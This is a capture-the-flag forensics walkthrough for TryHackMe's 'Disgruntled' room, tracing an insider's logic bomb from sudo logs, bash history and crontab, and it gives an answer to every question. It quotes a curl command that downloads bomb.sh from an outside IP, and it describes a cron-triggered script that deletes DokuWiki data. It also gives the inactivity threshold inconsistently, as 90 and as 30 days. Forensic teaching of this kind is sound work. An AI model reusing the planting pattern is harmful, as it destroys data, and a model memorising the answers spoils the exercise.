# TryHackMe: Disgruntled Challenge

Room URL: https://tryhackme.com/room/disgruntled



# Intro

Hey, kid! Good, you’re here!

Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.

CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.

**Linux Forensics Cheat sheet** -> https://blog.michweb.de/wp-content/uploads/2024/03/Linux-Forensics-Cheatsheet.pdf


# Nothing Suspicious...So Far

Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.

My advice: Look at the privileged commands that were run. That should get you started.

### Q1. The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

- all sudo commands will be logged in this log `/var/log/auth.log*`, 
```bash
cat /var/log/auth.log* |grep -i COMMAND
```
![Screenshot 2025-06-03 112417](https://github.com/user-attachments/assets/95970199-059d-4f61-93f4-96ded5796d3d)

Ans: ***/usr/bin/apt install dokuwiki***

### Q2. What was the present working directory (PWD) when the previous command was run?


Ans: ***/home/cybert***

---
# Let’s see if you did anything bad

Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.


### Q1.Which user was created after the package from the previous task was installed?

- At 06:26, he created a user called it-admin

![Screenshot 2025-06-03 113723](https://github.com/user-attachments/assets/258e012d-8266-43a1-adba-258a9eeccda8)


Ans: ***it-admin***


### Q2. A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

- This file, `/etc/sudoers`, controls who can use `sudo` and what commands they are allowed to run with root privileges
- `visudo` is a command-line utility that you can use to safely edit `/etc/sudoers` file

![Screenshot 2025-06-03 114420](https://github.com/user-attachments/assets/71643adf-fd44-4255-8ed0-b81dc6da8d9e)

- so, in Dec 28 06:27:34, the sudoers file was edited 

Ans: ***Dec 28 06:27:34***



### Q3. A script file was opened using the "vi" text editor. What is the name of this file?

- at 06:29:14, a bomb.sh file was opened using the vi text editor

![Screenshot 2025-06-03 115035](https://github.com/user-attachments/assets/3db2c21b-8c8f-41ef-b46d-9199ffca36b2)


Ans: ***bomb.sh***


---
# Bomb has been planted. But when and where?

That bomb.sh file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.

### Q1.What is the command used that created the file bomb.sh?

- The `.bash_history` file is a hidden file in your home directory that stores a record of commands you’ve run in the Bash shell.
- The `bomb.sh` file was opened from the it-admin user, let's search for the non-sudo commands typed by this user in the `.bash_history ` 
```bash
 cat /home/it-admin/.bash_history
```
![Screenshot 2025-06-03 115739](https://github.com/user-attachments/assets/3b9b2d1a-adef-4e3d-9a0e-f5bac5364880)


Ans: ***curl 10.10.158.38:8080/bomb.sh --output bomb.sh***


### Q2. The file was renamed and moved to a different directory. What is the full path of this file now?

- In the `.bash_history`, we saw that he uses the vi editor to edit the bomb.sh file
- Let's view the `.viminfo` file to view the editing history of the it-admin user.
```bash
cat /home/it-admin/.viminfo
```
![Screenshot 2025-06-03 120527](https://github.com/user-attachments/assets/e3f0726b-00aa-4280-b413-c0ee820eda3e)


Ans: ***/bin/os-update.sh***

### Q3. When was the file from the previous question last modified? (Format: Month Day HH:MM)

```bash
 ls -al --full-time /bin/os-update.sh
```
![Screenshot 2025-06-03 121423](https://github.com/user-attachments/assets/c176cea8-6318-4fc9-9c3a-920f9c23fea3)


Ans: ***Dec 28 06:29***


### Q4. What is the name of the file that will get created when the file from the first question executes?
```bash
nano /bin/os-update.sh
```
![Screenshot 2025-06-03 121838](https://github.com/user-attachments/assets/bdc6b811-28f3-4289-9281-fc063801ca1a)

- The fourth line tries to get the most recent login of the user `it-admin` that occurred within the last 90 days and pipe the result to grep the first line of the output (the most recent match). At last, save the result in the OUTPUT variable 
- `[ -z "$OUTPUT" ]` → Checks if the output is empty, meaning the user it-admin has not logged in during the past 90 days
- If true, deletes the entire Dokuwiki data directory, including possibly all wiki content and configuration, and echoes the message into the goodbye.txt file


Ans: ***goodbye.txt***



---
# Following the fuse

So we have a file and a motive. The question we now have is: how will this file be executed?

Surely, he wants it to execute at some point?

### Q1. At what time will the malicious file trigger? (Format: HH:MM AM/PM)
```bash
cat /etc/crontab
```
![Screenshot 2025-06-03 125446](https://github.com/user-attachments/assets/92cae1e5-9552-4a21-9367-c9a5046886b1)


Ans: ***08:00 AM***


---
# Conclusion
Thanks to you, we now have a good idea of what our disgruntled IT person was planning.

We know that he had downloaded a previously prepared script into the machine, which will delete all the files of the installed service if the user has not logged in to this machine in the last 30 days. It’s a textbook example of a  “logic bomb”, that’s for sure.
